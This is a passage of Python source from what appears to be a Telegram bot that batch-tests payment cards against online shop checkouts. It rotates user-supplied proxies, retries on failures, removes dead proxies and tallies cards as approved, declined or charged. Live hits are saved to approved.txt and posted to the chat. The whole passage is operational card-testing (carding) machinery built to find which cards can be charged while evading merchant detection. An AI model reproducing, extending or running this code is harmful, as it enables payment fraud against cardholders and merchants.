                            text=notify_text,
                            parse_mode=ParseMode.HTML,
                            disable_web_page_preview=True
                        )
                        logger.info(f"✅ {status.title()} notification sent successfully")
                    except Exception as e:
                        logger.error(f"❌ Error sending {status} notification: {e}")

        await update.effective_chat.send_message(
            text=f"Completed: {self.processed}/{self.total}\n"
                 f"Approved: {self.approved}\nDeclined: {self.declined}\nCharged: {self.charged}",
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True,
        )

    async def run_with_notifications(self, update: Update, context: ContextTypes.DEFAULT_TYPE, title: str):
        try:
            progress_msg = await update.effective_chat.send_message(
                text=progress_block(self.total, self.processed, self.approved, self.declined, self.charged, self.start_ts),
                parse_mode=ParseMode.HTML,
                disable_web_page_preview=True,
                reply_markup=self.stop_keyboard(),
            )
        except Exception as e:
            try:
                if isinstance(e, RetryAfter):
                    retry_after = e.retry_after
                    logger.warning(f"Flood control hit on initial message, waiting {retry_after} seconds")
                    await asyncio.sleep(retry_after)
                    progress_msg = await update.effective_chat.send_message(
                        text=progress_block(self.total, self.processed, self.approved, self.declined, self.charged, self.start_ts),
                        parse_mode=ParseMode.HTML,
                        disable_web_page_preview=True,
                        reply_markup=self.stop_keyboard(),
                    )
                else:
                    logger.error(f"Error sending initial progress message: {e}")
                    class DummyMsg:
                        def __init__(self):
                            self.chat_id = update.effective_chat.id
                            self.message_id = 0
                    progress_msg = DummyMsg()
            except Exception:
                logger.error(f"Failed to send initial progress message after retry: {e}")
                class DummyMsg:
                    def __init__(self):
                        self.chat_id = update.effective_chat.id
                        self.message_id = 0
                progress_msg = DummyMsg()

        sites_to_remove = set()

        # Use dynamic batch workers based on batch size for optimal performance
        optimal_workers = get_batch_workers(self.total)
        sem = asyncio.Semaphore(optimal_workers)
        logger.info(f"[BATCH] Using {optimal_workers} concurrent workers for batch of {self.total} cards")

        async def run_one(card: Dict):
            async with sem:
                attempts = 0
                selected_proxy_url: Optional[str] = None
                while True:
                    # Check for cancellation/pause FIRST - before any processing
                    try:
                        if self.cancel_event.is_set() or self.paused_for_proxies:
                            return card, "unknown", '"code": "CANCELLED"', "$0", "", selected_proxy_url, None, None
                    except Exception:
                        pass

                    # Check if all proxies were removed - pause the check IMMEDIATELY
                    try:
                        if self.paused_for_proxies:
                            return card, "unknown", '"code": "CANCELLED_NO_PROXIES"', "$0", "", selected_proxy_url, None, None
                        # Check if proxies_list is empty or None
                        if self.proxies_list is not None and len(self.proxies_list) == 0:
                            # All proxies removed - pause this check
                            self.paused_for_proxies = True
                            self.cancel_event.set()
                            # Save to pending immediately so it can resume when proxies are added
                            try:
                                # Get title from ACTIVE_BATCHES or use default
                                batch_title = title
                                try:
                                    async with ACTIVE_LOCK:
                                        rec = ACTIVE_BATCHES.get(self.batch_id)
                                        if rec and rec.get("counts"):
                                            batch_title = rec["counts"].get("title", title)
                                except Exception:
                                    pass
                                asyncio.create_task(self._save_to_pending_immediately(batch_title))
                            except Exception:
                                pass
                            try:
                                await update.effective_chat.send_message(
                                    "⚠️ <b>All Proxies Removed - Check Paused</b>\n\n"
                                    "All your proxies have been removed.\n\n"
                                    "<b>Add new proxies with /setpr to resume your check.</b>\n\n"
                                    "Your progress has been saved.",
                                    parse_mode=ParseMode.HTML
                                )
                            except Exception:
                                pass
                            return card, "unknown", '"code": "CANCELLED_NO_PROXIES"', "$0", "", selected_proxy_url, None, None
                        # Also check if proxies_mapping is None/empty when proxies_list is None
                        if self.proxies_list is None and (not self.proxies_mapping or (isinstance(self.proxies_mapping, dict) and not any(self.proxies_mapping.values()))):
                            # No proxies available at all
                            self.paused_for_proxies = True
                            self.cancel_event.set()
                            # Save to pending immediately so it can resume when proxies are added
                            try:
                                # Get title from ACTIVE_BATCHES or use default
                                batch_title = title
                                try:
                                    async with ACTIVE_LOCK:
                                        rec = ACTIVE_BATCHES.get(self.batch_id)
                                        if rec and rec.get("counts"):
                                            batch_title = rec["counts"].get("title", title)
                                except Exception:
                                    pass
                                asyncio.create_task(self._save_to_pending_immediately(batch_title))
                            except Exception:
                                pass
                            try:
                                await update.effective_chat.send_message(
                                    "⚠️ <b>No Proxies Available - Check Paused</b>\n\n"
                                    "No proxies are available for this check.\n\n"
                                    "<b>Add new proxies with /setpr to resume your check.</b>\n\n"
                                    "Your progress has been saved.",
                                    parse_mode=ParseMode.HTML
                                )
                            except Exception:
                                pass
                            return card, "unknown", '"code": "CANCELLED_NO_PROXIES"', "$0", "", selected_proxy_url, None, None
                    except Exception:
                        pass

                    mapping_to_use: Optional[Dict[str, str]] = None
                    try:
                        if self.proxies_list:
                            with self._proxy_idx_lock:
                                # Check again inside lock to ensure proxies haven't been removed
                                if not self.proxies_list or len(self.proxies_list) == 0:
                                    # Proxies list became empty - pause
                                    self.paused_for_proxies = True
                                    self.cancel_event.set()
                                    # Save to pending immediately so it can resume when proxies are added
                                    try:
                                        # Get title from ACTIVE_BATCHES or use default
                                        batch_title = title
                                        try:
                                            async with ACTIVE_LOCK:
                                                rec = ACTIVE_BATCHES.get(self.batch_id)
                                                if rec and rec.get("counts"):
                                                    batch_title = rec["counts"].get("title", title)
                                        except Exception:
                                            pass
                                        asyncio.create_task(self._save_to_pending_immediately(batch_title))
                                    except Exception:
                                        pass
                                    try:
                                        await update.effective_chat.send_message(
                                            "⚠️ <b>All Proxies Removed - Check Paused</b>\n\n"
                                            "All your proxies have been removed.\n\n"
                                            "<b>Add new proxies with /setpr to resume your check.</b>\n\n"
                                            "Your progress has been saved.",
                                            parse_mode=ParseMode.HTML
                                        )
                                    except Exception:
                                        pass
                                    return card, "unknown", '"code": "CANCELLED_NO_PROXIES"', "$0", "", selected_proxy_url, None, None
                                idx = self._proxy_idx % len(self.proxies_list)
                                self._proxy_idx += 1
                                selected_proxy_url = self.proxies_list[idx]
                                mapping_to_use = {"http": selected_proxy_url, "https": selected_proxy_url}
                        elif self.proxies_mapping:
                            # Check if proxies_mapping has valid proxies
                            if not any(self.proxies_mapping.values()):
                                self.paused_for_proxies = True
                                self.cancel_event.set()
                                # Save to pending immediately so it can resume when proxies are added
                                try:
                                    # Get title from ACTIVE_BATCHES or use default
                                    batch_title = title
                                    try:
                                        async with ACTIVE_LOCK:
                                            rec = ACTIVE_BATCHES.get(self.batch_id)
                                            if rec and rec.get("counts"):
                                                batch_title = rec["counts"].get("title", title)
                                    except Exception:
                                        pass
                                    asyncio.create_task(self._save_to_pending_immediately(batch_title))
                                except Exception:
                                    pass
                                return card, "unknown", '"code": "CANCELLED_NO_PROXIES"', "$0", "", selected_proxy_url, None, None
                            mapping_to_use = self.proxies_mapping
                            try:
                                selected_proxy_url = self.proxies_mapping.get("https") or self.proxies_mapping.get("http")
                            except Exception:
                                selected_proxy_url = None
                        else:
                            # No proxies available at all - don't proceed
                            self.paused_for_proxies = True
                            self.cancel_event.set()
                            # Save to pending immediately so it can resume when proxies are added
                            try:
                                # Get title from ACTIVE_BATCHES or use default
                                batch_title = title
                                try:
                                    async with ACTIVE_LOCK:
                                        rec = ACTIVE_BATCHES.get(self.batch_id)
                                        if rec and rec.get("counts"):
                                            batch_title = rec["counts"].get("title", title)
                                except Exception:
                                    pass
                                asyncio.create_task(self._save_to_pending_immediately(batch_title))
                            except Exception:
                                pass
                            return card, "unknown", '"code": "CANCELLED_NO_PROXIES"', "$0", "", selected_proxy_url, None, None
                    except Exception:
                        # If we can't get proxies, pause the check
                        self.paused_for_proxies = True
                        self.cancel_event.set()
                        # Save to pending immediately so it can resume when proxies are added
                        try:
                            # Get title from ACTIVE_BATCHES or use default
                            batch_title = title
                            try:
                                async with ACTIVE_LOCK:
                                    rec = ACTIVE_BATCHES.get(self.batch_id)
                                    if rec and rec.get("counts"):
                                        batch_title = rec["counts"].get("title", title)
                            except Exception:
                                pass
                            asyncio.create_task(self._save_to_pending_immediately(batch_title))
                        except Exception:
                            pass
                        return card, "unknown", '"code": "CANCELLED_NO_PROXIES"', "$0", "", selected_proxy_url, None, None

                    # Final check: Don't call check_single_card if we don't have valid proxies
                    if not mapping_to_use or (isinstance(mapping_to_use, dict) and not any(mapping_to_use.values())):
                        # No valid proxy mapping - pause
                        self.paused_for_proxies = True
                        self.cancel_event.set()
                        # Save to pending immediately so it can resume when proxies are added
                        try:
                            # Get title from ACTIVE_BATCHES or use default
                            batch_title = title
                            try:
                                async with ACTIVE_LOCK:
                                    rec = ACTIVE_BATCHES.get(self.batch_id)
                                    if rec and rec.get("counts"):
                                        batch_title = rec["counts"].get("title", title)
                            except Exception:
                                pass
                            asyncio.create_task(self._save_to_pending_immediately(batch_title))
                        except Exception:
                            pass
                        return card, "unknown", '"code": "CANCELLED_NO_PROXIES"', "$0", "", selected_proxy_url, None, None

                    # Double-check pause status before making the request
                    try:
                        if self.paused_for_proxies or self.cancel_event.is_set():
                            return card, "unknown", '"code": "CANCELLED"', "$0", "", selected_proxy_url, None, None
                    except Exception:
                        pass

                    try:
                        loop = asyncio.get_running_loop()
                        result = await loop.run_in_executor(self.executor, check_single_card, card, self.sites, mapping_to_use, self)
                        if len(result) == 7:
                            status, code_display, amount_display, site_label, used_proxy_url, site_url, receipt_id = result
                        elif len(result) == 6:
                            status, code_display, amount_display, site_label, used_proxy_url, site_url = result
                            receipt_id = None
                        elif len(result) == 5:
                            status, code_display, amount_display, site_label, used_proxy_url = result
                            site_url = None
                            receipt_id = None
                        elif len(result) == 4:
                            status, code_display, amount_display, site_label = result
                            used_proxy_url = selected_proxy_url
                            site_url = None
                            receipt_id = None
                        else:
                            status, code_display, amount_display, site_label = "unknown", '"code": "UNKNOWN"', "$0", ""
                            used_proxy_url = selected_proxy_url
                            site_url = None
                            receipt_id = None

                        if status == "unknown":
                            attempts += 1
                            if attempts < self.unknown_retry_max:
                                try:
                                    await asyncio.sleep(self.unknown_retry_delay)
                                except Exception:
                                    pass
                                continue
                            return card, status, code_display, amount_display, site_label, used_proxy_url, site_url, receipt_id

                        return card, status, code_display, amount_display, site_label, used_proxy_url, site_url, receipt_id

                    except Exception as e:
                        try:
                            logger.warning(f"Batch task failed: {e}")
                        except Exception:
                            pass
                        attempts += 1
                        if attempts < self.unknown_retry_max:
                            try:
                                await asyncio.sleep(self.unknown_retry_delay)
                            except Exception:
                                pass
                            continue
                        return card, "unknown", '"code": "UNKNOWN"', "$0", "", selected_proxy_url, None, None

        tasks = [asyncio.create_task(run_one(card)) for card in self.cards]

        try:
            async with ACTIVE_LOCK:
                ACTIVE_BATCHES[self.batch_id] = {
                    "event": self.cancel_event,
                    "tasks": tasks,
                    "chat_id": self.chat_id,
                    "user_id": self.user_id,
                    "user_name": ((getattr(update.effective_user, "full_name", None) or "").strip() or str(self.user_id)),
                    "user_username": getattr(update.effective_user, "username", None),
                    "progress": (progress_msg.chat_id, progress_msg.message_id),
                    "counts": {
                        "total": self.total,
                        "processed": self.processed,
                        "approved": self.approved,
                        "declined": self.declined,
                        "charged": self.charged,
                        "start_ts": self.start_ts,
                        "title": title,
                    },
                }
        except Exception:
            pass

        try:
            await add_pending(self.batch_id, {
                "batch_id": self.batch_id,
                "user_id": update.effective_user.id,
                "chat_id": update.effective_chat.id,
                "title": title,
                "cards": self.cards,
                "sites": self.sites,
                "send_approved_notifications": self.send_approved_notifications
            })
        except Exception:
            pass

        for t in asyncio.as_completed(tasks):
            # Check for cancellation or pause - if paused for proxies, cancel all tasks immediately
            if self.cancel_event.is_set() or self.paused_for_proxies:
                try:
                    # Cancel all pending tasks immediately when paused for proxies
                    for p in tasks:
                        if not p.done():
                            p.cancel()
                except Exception:
                    pass
                # If paused for proxies, break immediately to stop processing
                if self.paused_for_proxies:
                    break
                # For regular cancellation, also break
                break
            try:
                card, status, code_display, amount_display, site_label, used_proxy_url, site_url, receipt_id = await t
            except asyncio.CancelledError:
                # Check again if we should stop processing
                if self.paused_for_proxies:
                    try:
                        for p in tasks:
                            if not p.done():
                                p.cancel()
                    except Exception:
                        pass
                    break
                continue

            if site_url and isinstance(code_display, str):
                error_upper = code_display.upper()
                if "BUYER_IDENTITY_CURRENCY_NOT_SUPPORTED_BY_SHOP" in error_upper:
                    # DISABLED: Site removal disabled - never remove sites
                    # try:
                    #     checkout.remove_site_from_working_sites(site_url)
                    #     sites_to_remove.add(site_url)
                    #     try:
                    #         logger.info(f"Removed site {site_url} due to currency not supported error")
                    #     except Exception:
                    #         pass
                    logger.info(f"Site {site_url} has currency not supported error but removal is disabled")

            async with self.lock:
                if status == "charged":
                    self.charged += 1
                    self.processed += 1
                elif status == "approved":
                    self.approved += 1
                    self.processed += 1
                elif status == "declined":
                    self.declined += 1
                    self.processed += 1
                else:
                    # Count unknown/other statuses as processed but not approved/declined/charged
                    self.processed += 1

                # Update ACTIVE_BATCHES immediately after each card result for /active command
                try:
                    async with ACTIVE_LOCK:
                        rec = ACTIVE_BATCHES.get(self.batch_id)
                        if rec is not None:
                            rec["counts"] = {
                                "total": self.total,
                                "processed": self.processed,
                                "approved": self.approved,
                                "declined": self.declined,
                                "charged": self.charged,
                                "start_ts": self.start_ts,
                                "title": title,
                            }
                            ACTIVE_BATCHES[self.batch_id] = rec
                except Exception:
                    pass

                try:
                    if self.proxies_list and (used_proxy_url is not None and str(used_proxy_url).strip()):
                        if status == "unknown":
                            msg = (code_display or "").lower() if isinstance(code_display, str) else ""
                            
                            # Check if this is a currency not supported error - skip proxy failure detection
                            is_currency_error = isinstance(code_display, str) and "BUYER_IDENTITY_CURRENCY_NOT_SUPPORTED" in code_display.upper()
                            
                            if is_currency_error:
                                # Currency not supported is not a proxy problem, so don't count it as a proxy failure
                                if used_proxy_url in self.per_proxy_unknown:
                                    # Reset counter for this proxy since it's working fine
                                    self.per_proxy_unknown[used_proxy_url] = 0
                            else:
                                # Only check for proxy failures if it's not a currency error
                                proxy_signals = [
                                    "unable to connect to proxy",
                                    "proxyerror",
                                    "max retries exceeded",
                                    "connect timeout",
                                    "connection to ",
                                    "failed to establish a new connection",
                                    "connection refused",
                                    "connection timed out",
                                    "too many open connections",
                                    "tunnel connection failed",
                                    "httpsconnectionpool",
                                    "connectionpool",
                                    "proxy server",
                                    "proxy connection",
                                ]
                                critical_proxy_errors = [
                                    "too many open connections",
                                    "tunnel connection failed",
                                    "unable to connect to proxy",
                                    "httpsconnectionpool",
                                    "connectionpool",
                                ]
                                is_critical_error = any(sig in msg for sig in critical_proxy_errors)
                                is_proxy_failure = any(sig in msg for sig in proxy_signals)
                                
                                if is_proxy_failure:
                                    cnt = int(self.per_proxy_unknown.get(used_proxy_url, 0)) + 1
                                    self.per_proxy_unknown[used_proxy_url] = cnt
                                    # Increased thresholds to reduce aggressive proxy removal
                                    # Critical errors: 30 failures, Non-critical: 25 failures
                                    threshold = 30 if is_critical_error else 25
                                    
                                    # Log proxy error
                                    error_type = "Critical_Proxy_Error" if is_critical_error else "Proxy_Failure"
                                    error_msg = msg[:200] if msg else "Unknown proxy error"
                                    log_proxy_error(used_proxy_url, error_type, f"{error_msg} ({cnt} failures)", self.user_id)
                                    
                                    if cnt >= threshold:
                                        try:
                                            reason_text = "Critical proxy error" if is_critical_error else f"Proxy failure ({cnt} consecutive failures)"
                                            await remove_user_proxy(self.user_id, used_proxy_url, reason_text)
                                        except Exception:
                                            pass
                                        try:
                                            with self._proxy_idx_lock:
                                                try:
                                                    self.proxies_list = [p for p in (self.proxies_list or []) if p != used_proxy_url]
                                                except Exception:
                                                    pass
                                        except Exception:
                                            pass
                                        try:
                                            masked = _mask_proxy_display(used_proxy_url)
                                            reason = "Critical proxy error" if is_critical_error else f"{cnt} consecutive failures"
                                            
                                            try:
                                                display_name, username = await get_user_info_for_proxy(self.user_id)
                                                user_display = f'<a href="tg://user?id={self.user_id}">{username if username else display_name}</a>'
                                            except Exception:
                                                user_display = f'<a href="tg://user?id={self.user_id}">{self.user_id}</a>'
                                            
                                            await update.effective_chat.send_message(
                                                f"⚠️ <b>Proxy Dead - Removed</b>\n\n"
                                                f"Proxy: <code>{masked}</code>\n\n"
                                                f"User: {user_display}\n\n"
                                                f"Reason: {reason}\n\n"
                                                f"<b>Please add a new proxy with /setpr</b>",
                                                parse_mode=ParseMode.HTML
                                            )
                                        except Exception:
                                            pass
                                        if not self.proxies_list:
                                            try:
                                                await clear_user_proxy(self.user_id)
                                            except Exception:
                                                pass
                                            # Set paused flag and cancel event IMMEDIATELY
                                            self.paused_for_proxies = True
                                            self.cancel_event.set()
                                            # Update ACTIVE_BATCHES to reflect pause status
                                            try:
                                                async with ACTIVE_LOCK:
                                                    rec = ACTIVE_BATCHES.get(self.batch_id)
                                                    if rec is not None:
                                                        rec["paused_for_proxies"] = True
                                                        ACTIVE_BATCHES[self.batch_id] = rec
                                            except Exception:
                                                pass
                                            try:
                                                await update.effective_chat.send_message(
                                                    "⚠️ <b>All Proxies Dead - Check Paused</b>\n\n"
                                                    "All your proxies have failed.\n\n"
                                                    "<b>Add new proxies with /setpr to resume your check.</b>\n\n"
                                                    "Your progress has been saved.",
                                                    parse_mode=ParseMode.HTML
                                                )
                                            except Exception:
                                                pass
                                else:
                                    # Not a proxy failure, reset counter
                                    if used_proxy_url in self.per_proxy_unknown:
                                        self.per_proxy_unknown[used_proxy_url] = 0
                        else:  # status is not "unknown"
                            # Status is not "unknown", reset counter
                            if used_proxy_url in self.per_proxy_unknown:
                                self.per_proxy_unknown[used_proxy_url] = 0
                    elif self.proxies_mapping:
                        is_critical_error = False
                        if status == "unknown":
                            msg = (code_display or "").lower() if isinstance(code_display, str) else ""
                            proxy_signals = [
                                "unable to connect to proxy",
                                "proxyerror",
                                "max retries exceeded",
                                "connect timeout",
                                "connection to ",
                                "failed to establish a new connection",
                                "connection refused",
                                "connection timed out",
                                "too many open connections",
                                "tunnel connection failed",
                                "httpsconnectionpool",
                                "connectionpool",
                                "proxy server",
                                "proxy connection",
                            ]
                            critical_proxy_errors = [
                                "too many open connections",
                                "tunnel connection failed",
                                "unable to connect to proxy",
                                "httpsconnectionpool",
                                "connectionpool",
                            ]
                            is_critical_error = any(sig in msg for sig in critical_proxy_errors)
                            
                            if any(sig in msg for sig in proxy_signals):
                                self.unknown_streak += 1
                            else:
                                self.unknown_streak = 0
                        else:
                            self.unknown_streak = 0
                        
                        # Increased thresholds to reduce aggressive proxy removal
                        # Critical errors: 30 failures, Non-critical: 25 failures
                        threshold = 30 if is_critical_error else 25
                        if (self.unknown_streak >= threshold) and (not self.proxy_dead_notified):
                            self.proxy_dead_notified = True
                            try:
                                proxy_url = str(self.proxies_mapping.get('http', 'Unknown')) if self.proxies_mapping else 'Unknown'
                            except Exception:
                                proxy_url = 'Unknown'
                            
                            try:
                                await clear_user_proxy(self.user_id)
                            except Exception:
                                pass
                            self.proxies_mapping = None
                            
                            try:
                                masked = _mask_proxy_display(proxy_url)
                                reason = "Critical proxy error" if is_critical_error else f"{self.unknown_streak} consecutive failures"
                                
                                # Log proxy error
                                error_type = "Critical_Proxy_Error" if is_critical_error else "Proxy_Failure"
                                error_msg = (code_display or "").lower()[:200] if code_display else "Unknown proxy error"
                                log_proxy_error(proxy_url, error_type, f"{error_msg} ({self.unknown_streak} failures)", self.user_id)
                                
                                try:
                                    display_name, username = await get_user_info_for_proxy(self.user_id)
                                    user_display = f'<a href="tg://user?id={self.user_id}">{username if username else display_name}</a>'
                                except Exception:
                                    user_display = f'<a href="tg://user?id={self.user_id}">{self.user_id}</a>'
                                
                                await update.effective_chat.send_message(
                                    f"⚠️ <b>Proxy Dead - Removed</b>\n\n"
                                    f"Proxy: <code>{masked}</code>\n\n"
                                    f"User: {user_display}\n\n"
                                    f"Reason: {reason}\n\n"
                                    f"<b>Please add a new proxy with /setpr</b>",
                                    parse_mode=ParseMode.HTML
                                )
                                # Set paused flag and cancel event IMMEDIATELY
                                self.paused_for_proxies = True
                                self.cancel_event.set()
                                # Save to pending immediately so it can resume when proxies are added
                                try:
                                    # Get title from ACTIVE_BATCHES or use default
                                    title = "Batch"
                                    try:
                                        async with ACTIVE_LOCK:
                                            rec = ACTIVE_BATCHES.get(self.batch_id)
                                            if rec and rec.get("counts"):
                                                title = rec["counts"].get("title", "Batch")
                                    except Exception:
                                        pass
                                    asyncio.create_task(self._save_to_pending_immediately(title))
                                except Exception:
                                    pass
                                # Update ACTIVE_BATCHES to reflect pause status
                                try:
                                    async with ACTIVE_LOCK:
                                        rec = ACTIVE_BATCHES.get(self.batch_id)
                                        if rec is not None:
                                            rec["paused_for_proxies"] = True
                                            ACTIVE_BATCHES[self.batch_id] = rec
                                except Exception:
                                    pass
                                await update.effective_chat.send_message(
                                    "⚠️ <b>All Proxies Dead - Check Paused</b>\n\n"
                                    "All your proxies have failed.\n\n"
                                    "<b>Add new proxies with /setpr to resume your check.</b>\n\n"
                                    "Your progress has been saved.",
                                    parse_mode=ParseMode.HTML
                                )
                            except Exception:
                                pass
                except Exception:
                    pass
                
                try:
                    if self.proxies_list and not self.proxy_removed:
                        for proxy_url, count in self.consecutive_429_errors.items():
                            if count >= self.dead_proxy_threshold and proxy_url in self.proxies_list:
                                await self.remove_dead_proxy(proxy_url, update, context)
                                break
                except Exception as e:
                    logger.error(f"Error checking for dead proxies: {e}")

                # Update stats - for large batches, make it non-blocking to avoid slowing down processing
                # For batches > 1000, update stats in background; for smaller batches, update immediately
                if self.total > 1000:
                    # Large batches: fire-and-forget stats update (non-blocking)
                    try:
                        user = update.effective_user
                        display_name = (user.full_name or "").strip()
                        if not display_name:
                            uname = (user.username or "").strip()
                            display_name = f"@{uname}" if uname else str(user.id)
                        # Create background task - don't await to avoid blocking
                        asyncio.create_task(inc_user_stats(
                            user_id=user.id,
                            name=display_name,
                            username=user.username,
                            tested=1,
                            approved=1 if status == "approved" else 0,
                            charged=1 if status == "charged" else 0,
                            chat_id=update.effective_chat.id,
                        ))
                    except Exception:
                        pass
                else:
                    # Small batches: update stats immediately (blocking but acceptable for small batches)
                    try:
                        user = update.effective_user
                        display_name = (user.full_name or "").strip()
                        if not display_name:
                            uname = (user.username or "").strip()
                            display_name = f"@{uname}" if uname else str(user.id)
                        await inc_user_stats(
                            user_id=user.id,
                            name=display_name,
                            username=user.username,
                            tested=1,
                            approved=1 if status == "approved" else 0,
                            charged=1 if status == "charged" else 0,
                            chat_id=update.effective_chat.id,
                        )
                    except Exception:
                        pass

                # Update ACTIVE_BATCHES again here to ensure it's synced (already updated earlier, but this ensures consistency)
                try:
                    async with ACTIVE_LOCK:
                        rec = ACTIVE_BATCHES.get(self.batch_id)
                        if rec is not None:
                            rec["counts"] = {
                                "total": self.total,
                                "processed": self.processed,
                                "approved": self.approved,
                                "declined": self.declined,
                                "charged": self.charged,
                                "start_ts": self.start_ts,
                                "title": title,
                            }
                            ACTIVE_BATCHES[self.batch_id] = rec
                except Exception:
                    pass

                current_time = time.time()
                if current_time - self.last_progress_update >= self.progress_update_interval:
                    try:
                        if hasattr(progress_msg, 'chat_id') and hasattr(progress_msg, 'message_id'):
                            await context.bot.edit_message_text(
                                chat_id=progress_msg.chat_id,
                                message_id=progress_msg.message_id,
                                text=progress_block(self.total, self.processed, self.approved, self.declined, self.charged, self.start_ts),
                                parse_mode=ParseMode.HTML,
                                disable_web_page_preview=True,
                                reply_markup=self.stop_keyboard(),
                            )
                            self.last_progress_update = current_time
                    except Exception as e:
                        try:
                            if isinstance(e, RetryAfter):
                                retry_after = e.retry_after
                                logger.warning(f"Flood control hit on progress update, waiting {retry_after} seconds")
                                await asyncio.sleep(retry_after)
                                try:
                                    if hasattr(progress_msg, 'chat_id') and hasattr(progress_msg, 'message_id'):
                                        await context.bot.edit_message_text(
                                            chat_id=progress_msg.chat_id,
                                            message_id=progress_msg.message_id,
                                            text=progress_block(self.total, self.processed, self.approved, self.declined, self.charged, self.start_ts),
                                            parse_mode=ParseMode.HTML,
                                            disable_web_page_preview=True,
                                            reply_markup=self.stop_keyboard(),
                                        )
                                        self.last_progress_update = current_time
                                except Exception:
                                    pass
                            else:
                                logger.error(f"Error updating progress: {e}")
                        except Exception:
                            logger.error(f"Failed to update progress after retry: {e}")

            logger.info(f"[DEBUG-RUN2] Card result - status: {status}, code: {code_display}")
            if status in ("approved", "charged"):
                logger.info(f"[DEBUG-RUN2] Entering approved/charged block for {status}")
                display_name = None
                user_id = None
                try:
                    user = update.effective_user
                    user_id = user.id
                    display_name = (user.full_name or "").strip()
                    if not display_name:
                        uname = (user.username or "").strip()
                        display_name = uname if uname else str(user.id)
                except Exception:
                    pass
                
                logger.info(f"[DEBUG-RUN2] About to persist to approved.txt - status: {status}")
                try:
                    with APPROVED_FILE_LOCK:
                        site_display_val = site_label
                        if isinstance(display_name, str) and display_name.strip():
                            site_display_val = f"{site_label} |  {display_name.strip()}"
                        logger.info(f"[DEBUG-RUN2] Writing to approved.txt: {site_display_val}")
                        try:
                            checkout.emit_summary_line(card, code_display, amount_display, site_display=site_display_val)
                        except TypeError:
                            checkout.emit_summary_line(card, code_display, amount_display)
                except Exception:
                    pass
                
                send_chat = (status == "charged") or (status == "approved" and self.send_approved_notifications)
                logger.info(f"[DEBUG-RUN2] send_chat = {send_chat}, send_approved_notifications = {self.send_approved_notifications}")
                if send_chat:
                    try:
                        notify_text = result_notify_text(card, status, code_display, amount_display, site_label, display_name, receipt_id, user_id)
                        logger.info(f"Sending {status} notification for card ending in {card.get('number', '')[-4:]}")
                        await update.effective_chat.send_message(
                            text=notify_text,
                            parse_mode=ParseMode.HTML,
                            disable_web_page_preview=True,
                        )
                        logger.info(f"✅ {status.title()} notification sent successfully")
                    except Exception as e:
                        logger.error(f"❌ Error sending {status} notification: {e}")
                        try:
                            from telegram.error import RetryAfter
                            if isinstance(e, RetryAfter):
                                retry_after = e.retry_after
                                logger.warning(f"Flood control hit on notification, waiting {retry_after} seconds")
                                await asyncio.sleep(retry_after)
                                await update.effective_chat.send_message(
                                    text=result_notify_text(card, status, code_display, amount_display, site_label, display_name, receipt_id, user_id),
                                    parse_mode=ParseMode.HTML,
                                    disable_web_page_preview=True,
                                )
                                logger.info(f"✅ {status.title()} notification sent after retry")
                            else:
                                logger.error(f"Non-retriable error sending notification: {e}")
                        except Exception as ex:
                            logger.error(f"Failed to send notification after retry: {ex}")
    
        try:
            async with ACTIVE_LOCK:
                ACTIVE_BATCHES.pop(self.batch_id, None)
        except Exception:
            pass

        cancelled = False
        try:
            cancelled = self.cancel_event.is_set()
        except Exception:
            cancelled = False

        try:
            if (self.processed >= self.total) or (cancelled and not self.paused_for_proxies):
                await remove_pending(self.batch_id)
            elif self.paused_for_proxies:
                try:
                    await add_pending(self.batch_id, {
                        "batch_id": self.batch_id,
                        "user_id": self.user_id,
                        "chat_id": self.chat_id,
                        "title": title,
                        "cards": self.cards,
                        "sites": self.sites,
                        "send_approved_notifications": self.send_approved_notifications,
                        "processed": self.processed
                    })
                    logger.info(f"Batch {self.batch_id} paused for proxies - saved to pending with {self.processed}/{self.total} processed")
                except Exception as e:
                    logger.error(f"Failed to update pending batch: {e}")
        except Exception:
            pass

        try:
            if hasattr(progress_msg, 'chat_id') and hasattr(progress_msg, 'message_id'):
                await context.bot.edit_message_text(
                    chat_id=progress_msg.chat_id,
                    message_id=progress_msg.message_id,
                    text=progress_block(self.total, self.processed, self.approved, self.declined, self.charged, self.start_ts),
                    parse_mode=ParseMode.HTML,
                    disable_web_page_preview=True,
                    reply_markup=None,
                )
        except Exception:
            pass

        pending = max(0, self.total - self.processed)
        if self.processed == self.total:
            final_text = (
                f"Completed: {self.processed}/{self.total}\n"
                f"Approved: {self.approved}\nDeclined: {self.declined}\nCharged: {self.charged}"
            )
        else:
            final_text = (
                f"Stopped: {self.processed}/{self.total} (pending: {pending})\n"
                f"Approved: {self.approved}\nDeclined: {self.declined}\nCharged: {self.charged}"
            )
        try:
            await update.effective_chat.send_message(
                text=final_text,
                parse_mode=ParseMode.HTML,
                disable_web_page_preview=True,
            )
        except Exception as e:
            try:
                from telegram.error import RetryAfter
                if isinstance(e, RetryAfter):
                    retry_after = e.retry_after
                    logger.warning(f"Flood control hit, waiting {retry_after} seconds")
                    await asyncio.sleep(retry_after)
                    await update.effective_chat.send_message(
                        text=final_text,
                        parse_mode=ParseMode.HTML,
                        disable_web_page_preview=True,
                    )
                else:
                    logger.error(f"Error sending final message: {e}")
            except Exception:
                logger.error(f"Failed to send final message after retry: {e}")

def mask_proxy_password(proxy_url: str) -> str:
    """Mask the password in a proxy URL, leaving other parts visible."""
    try:
        if not proxy_url or ":" not in proxy_url:
            return proxy_url
        
        if "//" in proxy_url:
            if "@" in proxy_url:
                prefix, rest = proxy_url.rsplit("@", 1)
                if ":" in prefix:
                    parts = prefix.split(":")
                    if len(parts) >= 2:
                        return f"{':'.join(parts[:-1])}:****@{rest}"
            return proxy_url
            
        parts = proxy_url.split(":")
        if len(parts) >= 4:
            return f"{':'.join(parts[:-1])}:****"
            
        return proxy_url
    except Exception:
        return proxy_url

async def get_user_proxy_info(user_id: int) -> Optional[Tuple[str, str, str]]:
    """Get a user's current proxy info: (proxy_url, display_name, username)."""
    uid = str(int(user_id))
    with PROXIES_LOCK:
        recs = _read_proxy_records()
        for (u, name, username, proxy, _) in recs:
            if u == uid:
                return (proxy, name, username)
    return None

async def cmd_show(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show proxy information for a user.
    
    Usage:
    /show - Show your own proxy
    /show <user_id> - (Admin only) Show proxy for specific user
    """
    if not await ensure_access(update, context):
        return

    user = update.effective_user
    args = context.args or []
    
    if args:
        if not is_admin(user.id):
            await update.message.reply_text("Only admins can check other users' proxies.")
            return
            
        try:
            target_id = int(args[0])
            
            # Check if user is restricted
            if target_id in RESTRICTED_USER_IDS:
                await update.message.reply_text("❌ Restricted")
                return
            
            try:
                proxies = await get_user_proxies(target_id)
            except Exception:
                proxies = []
            
            if not proxies:
